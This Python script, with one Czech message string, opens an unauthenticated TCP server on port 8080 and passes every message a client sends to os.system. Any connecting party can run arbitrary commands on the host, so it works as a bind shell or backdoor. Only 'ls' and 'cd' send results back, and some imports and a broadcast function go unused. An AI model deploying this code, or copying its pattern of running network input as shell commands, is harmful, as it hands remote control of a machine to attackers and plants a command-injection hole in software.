import socket
import threading
import os
import base64
import requests

ip = '192.168.0.168'
port = 8080


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((ip, port))
server_socket.listen()

clients = []

def handle_client(client_socket):
    while True:
        try:
            message = client_socket.recv(1024).decode()
            if not message:
                break
            
            
            
            if message.lower() == "ls":
                current_directory = os.getcwd()
                directory_contents = "\n".join(os.listdir(current_directory))
                client_socket.send(directory_contents.encode())
                
            
            elif message.lower().startswith("cd "):
                directory_to_change = message[3:]
                try:
                    os.chdir(directory_to_change)
                    current_directory = os.getcwd()
                    response = f"Aktuální adresář změněn na {current_directory}"
                except Exception as e:
                    response = str(e)
                client_socket.send(response.encode())
            
            
            os.system(f"{message}")

        except:
            break

    clients.remove(client_socket)
    client_socket.close()





def broadcast(message):
    for client in clients:
        try:
            client.send(message.encode())
        except:
            clients.remove(client)

while True:
    client_socket, client_address = server_socket.accept()
    clients.append(client_socket)

    client_thread = threading.Thread(target=handle_client, args=(client_socket,))
    client_thread.start()
